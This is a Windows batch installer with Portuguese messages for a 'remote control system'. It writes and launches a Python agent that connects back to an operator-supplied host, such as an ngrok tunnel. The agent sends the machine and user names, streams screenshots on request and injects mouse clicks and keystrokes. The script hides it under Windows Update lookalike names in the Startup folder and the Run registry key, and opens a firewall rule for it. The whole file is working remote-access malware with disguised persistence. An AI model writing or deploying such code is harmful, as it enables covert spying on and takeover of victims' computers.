@echo off
title Instalador Simples - Sistema de Controle Remoto
color 0A
echo.
echo ========================================
echo INSTALADOR SIMPLES
echo Sistema de Controle Remoto
echo ========================================
echo.
REM Verifica se o Python esta instalado
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERRO] Python nao encontrado!
    echo.
    echo Por favor, instale o Python primeiro:
    echo https://www.python.org/downloads/
    echo.
    pause
    exit /b 1
)
echo [OK] Python encontrado!
echo.
REM Instala dependencias
echo [INFO] Instalando dependencias...
pip install Pillow pynput pywin32 --quiet
if errorlevel 1 (
    echo [ERRO] Falha ao instalar dependencias!
    echo Tentando instalar individualmente...
    pip install Pillow --quiet
    pip install pynput --quiet
    pip install pywin32 --quiet
)
echo [OK] Dependencias instaladas!
echo.
REM Prompt para host e porta (automatizado para redes diferentes)
echo Digite o host/IP ou URL completa do centro de controle (ex: 172.20.10.4 para local ou tcp://0.tcp.ngrok.io:12345 para publico):
set /p CLIENT_INPUT=
echo Digite a porta do centro de controle (deixe vazio se ja informado na URL acima, padrao 8443):
set /p CLIENT_PORT_INPUT=

REM Parse host e port da entrada (remove http:// ou tcp:// e extrai port se presente)
set CLIENT_HOST=%CLIENT_INPUT:http://=%
set CLIENT_HOST=%CLIENT_HOST:tcp://=%
if "%CLIENT_HOST:~-1%" == "/" set CLIENT_HOST=%CLIENT_HOST:~0,-1%
for /f "tokens=1,2 delims=:" %%a in ("%CLIENT_HOST%") do (
    set CLIENT_HOST=%%a
    if not "%%b" == "" set CLIENT_PORT=%%b
)
if not "%CLIENT_PORT_INPUT%" == "" set CLIENT_PORT=%CLIENT_PORT_INPUT%
if "%CLIENT_PORT%" == "" set CLIENT_PORT=8443
echo.
REM Cria diretorio de instalacao
set "INSTALL_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate"
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" 2>nul
    echo [OK] Diretorio criado: %INSTALL_DIR%
)
REM Cria os diretorios para o Startup se nao existirem
mkdir "%APPDATA%\Microsoft" 2>nul
mkdir "%APPDATA%\Microsoft\Windows" 2>nul
mkdir "%APPDATA%\Microsoft\Windows\Start Menu" 2>nul
mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs" 2>nul
mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
REM Cria o servidor automaticamente com host/port informados
echo [INFO] Criando servidor de controle remoto com host %CLIENT_HOST% e porta %CLIENT_PORT%...
(
echo import socket, threading, json, base64, time, os, sys
echo from PIL import ImageGrab
echo import io
echo import win32gui, win32con, win32api
echo.
echo class RemoteServer:
echo     def __init__(self, client_host='%CLIENT_HOST%', client_port=%CLIENT_PORT%^):
echo         self.client_host = client_host
echo         self.client_port = client_port
echo         self.socket = None
echo         self.connected = False
echo         self.running = False
echo         self.server_name = os.environ.get('COMPUTERNAME', 'PC-Desconhecido'^)
echo         self.server_info = {'name': self.server_name, 'user': os.environ.get('USERNAME', 'Usuario'^), 'os': os.name}
echo         self.buffer = b''
echo.
echo     def start_connection(self^):
echo         self.running = True
echo         while self.running:
echo             try:
echo                 if not self.connected: self.connect_to_client(^)
echo                 if self.connected: self.handle_communication(^)
echo             except Exception as e:
echo                 print(f"Erro na conexao: {e}"^)
echo                 self.connected = False
echo                 time.sleep(5^)
echo.
echo     def connect_to_client(self^):
echo         try:
echo             print(f"Tentando conectar ao centro de controle em {self.client_host}:{self.client_port}"^)
echo             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM^)
echo             self.socket.settimeout(10^)
echo             self.socket.connect((self.client_host, self.client_port^)^)
echo             self.socket.send(json.dumps(self.server_info^).encode(^)^)
echo             self.socket.settimeout(None^)  # Remover timeout apos conexao para recv bloqueante
echo             self.connected = True
echo             print(f"Conectado ao centro de controle como {self.server_name}"^)
echo             self.buffer = b''
echo         except Exception as e:
echo             print(f"Erro ao conectar: {e}"^)
echo             self.connected = False
echo             if self.socket: self.socket.close(^)
echo.
echo     def handle_communication(self^):
echo         try:
echo             while self.connected and self.running:
echo                 data = self.socket.recv(1024^)
echo                 if not data:
echo                     raise Exception("Conexao fechada pelo cliente"^)
echo                 self.buffer += data
echo                 self.process_buffer(^)
echo         except Exception as e:
echo             print(f"Erro na comunicacao: {e}"^)
echo             self.connected = False
echo             if self.socket: self.socket.close(^)
echo.
echo     def process_buffer(self^):
echo         while self.buffer:
echo             try:
echo                 buffer_str = self.buffer.decode('utf-8'^)
echo                 decoder = json.JSONDecoder(^)
echo                 command, end = decoder.raw_decode(buffer_str^)
echo                 self.process_command(command^)
echo                 self.buffer = self.buffer[end:]
echo             except json.JSONDecodeError:
echo                 break
echo             except UnicodeDecodeError:
echo                 break
echo.
echo     def process_command(self, command^):
echo         command_type = command.get("type"^)
echo         if command_type == "get_screenshot": self.send_screenshot(^)
echo         elif command_type == "mouse_click": self.handle_mouse_click(command^)
echo         elif command_type == "mouse_move": self.handle_mouse_move(command^)
echo         elif command_type == "key_press": self.handle_key_press(command^)
echo         elif command_type == "ping": self.send_pong(^)
echo.
echo     def send_screenshot(self^):
echo         try:
echo             screenshot = ImageGrab.grab(^)
echo             img_buffer = io.BytesIO(^)
echo             screenshot.save(img_buffer, format='PNG'^)
echo             img_data = img_buffer.getvalue(^)
echo             img_base64 = base64.b64encode(img_data^).decode(^)
echo             response = {"type": "screenshot", "data": img_base64, "width": screenshot.width, "height": screenshot.height}
echo             self.socket.send(json.dumps(response^).encode(^)^)
echo         except Exception as e: print(f"Erro ao capturar screenshot: {e}"^)
echo.
echo     def handle_mouse_click(self, command^):
echo         try:
echo             x, y = command.get("x", 0^), command.get("y", 0^)
echo             button, action = command.get("button", "left"^), command.get("action", "click"^)
echo             if action == "click":
echo                 if button == "left":
echo                     win32api.SetCursorPos((x, y^)^)
echo                     win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0^)
echo                     win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, x, y, 0, 0^)
echo                 elif button == "right":
echo                     win32api.SetCursorPos((x, y^)^)
echo                     win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0^)
echo                     win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x, y, 0, 0^)
echo         except Exception as e: print(f"Erro ao processar clique do mouse: {e}"^)
echo.
echo     def handle_mouse_move(self, command^):
echo         try:
echo             x, y = command.get("x", 0^), command.get("y", 0^)
echo             win32api.SetCursorPos((x, y^)^)
echo         except Exception as e: print(f"Erro ao mover mouse: {e}"^)
echo.
echo     def handle_key_press(self, command^):
echo         try:
echo             key, action = command.get("key", ""^), command.get("action", "press"^)
echo             key_map = {"enter": win32con.VK_RETURN, "tab": win32con.VK_TAB, "space": win32con.VK_SPACE, "ctrl": win32con.VK_CONTROL, "alt": win32con.VK_MENU, "shift": win32con.VK_SHIFT, "win": win32con.VK_LWIN, "esc": win32con.VK_ESCAPE, "backspace": win32con.VK_BACK, "delete": win32con.VK_DELETE}
echo             vk_code = key_map.get(key, ord(key.upper(^)^) if len(key^) == 1 else 0^)
echo             if action == "press":
echo                 win32api.keybd_event(vk_code, 0, 0, 0^)
echo                 win32api.keybd_event(vk_code, 0, win32con.KEYEVENTF_KEYUP, 0^)
echo         except Exception as e: print(f"Erro ao processar tecla: {e}"^)
echo.
echo     def send_pong(self^):
echo         try:
echo             response = {"type": "pong", "timestamp": time.time(^)^}
echo             self.socket.send(json.dumps(response^).encode(^)^)
echo         except Exception as e: print(f"Erro ao enviar pong: {e}"^)
echo.
echo     def stop(self^):
echo         self.running = False
echo         self.connected = False
echo         if self.socket: self.socket.close(^)
echo.
echo def main(^):
echo     CLIENT_HOST = '%CLIENT_HOST%'  # IP ou host do centro de controle
echo     CLIENT_PORT = %CLIENT_PORT%
echo     print("=== SERVIDOR DE CONTROLE REMOTO ==="^)
echo     print(f"Conectando ao centro de controle: {CLIENT_HOST}:{CLIENT_PORT}"^)
echo     server = RemoteServer(CLIENT_HOST, CLIENT_PORT^)
echo     try:
echo         server.start_connection(^)
echo     except KeyboardInterrupt:
echo         print("\nParando servidor..."^)
echo         server.stop(^)
echo.
echo if __name__ == "__main__":
echo     main(^)
) > "%INSTALL_DIR%\remote_server.py"
echo [OK] Servidor criado!
echo.
REM Configura inicializacao automatica
echo [INFO] Configurando inicializacao automatica...
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "python \"%INSTALL_DIR%\remote_server.py\"" /f >nul
echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat"
echo cd /d "%INSTALL_DIR%" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat"
echo python "remote_server.py" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat"
echo [OK] Inicializacao automatica configurada!
echo.
REM Configura firewall
echo [INFO] Configurando firewall...
netsh advfirewall firewall add rule name="WindowsUpdate" dir=out action=allow protocol=TCP remoteport=%CLIENT_PORT% >nul 2>&1
echo [OK] Firewall configurado!
echo.
REM Inicia o servico
echo [INFO] Iniciando servico...
cd /d "%INSTALL_DIR%"
start python "remote_server.py"
echo [OK] Servico iniciado!
echo.
echo ========================================
echo INSTALACAO CONCLUIDA COM SUCESSO!
echo ========================================
echo.
echo O sistema foi instalado e configurado.
echo Localizacao: %INSTALL_DIR%
echo.
echo Pressione qualquer tecla para sair...
pause >nul